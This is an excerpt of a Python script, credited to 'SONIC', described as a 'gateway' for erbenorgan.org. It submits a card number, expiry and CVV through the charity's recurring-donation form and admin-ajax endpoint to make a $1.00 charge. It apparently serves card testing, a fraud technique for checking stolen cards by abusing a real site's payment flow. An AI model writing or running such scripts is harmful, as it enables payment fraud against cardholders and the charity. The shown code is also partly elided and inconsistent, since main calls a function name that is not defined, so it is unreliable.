...
def charge1usdt(ccx):
    """
    Gateway extracted from erbenorgan.org
    Developed by: SONIC 🍀
    Amount: $1.00
    """
    ccx = ccx.strip()
    ...
    try:
        response = r.get('https://erbenorgan.org/donate/donate-recurring/', cookies=r.cookies, headers=headers)
        ...
        headers = {
            'origin': 'https://erbenorgan.org',
            'referer': 'https://erbenorgan.org/donate/donate-recurring/',
        ...
        data = {
            ...
            'give-form-title': '',
            'give-current-url': 'https://erbenorgan.org/donate/donate-recurring/',
            'give-form-url': 'https://erbenorgan.org/donate/donate-recurring/',
        ...
        r.post('https://erbenorgan.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        ...
        data = MultipartEncoder({
            ...
            'give-current-url': (None, 'https://erbenorgan.org/donate/donate-recurring/'),
            'give-form-url': (None, 'https://erbenorgan.org/donate/donate-recurring/'),
        ...
        response = r.post('https://erbenorgan.org/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
...
if __name__ == "__main__":
    print(gateway_erbenorgan_org('4217834081794714|11|26|614'))
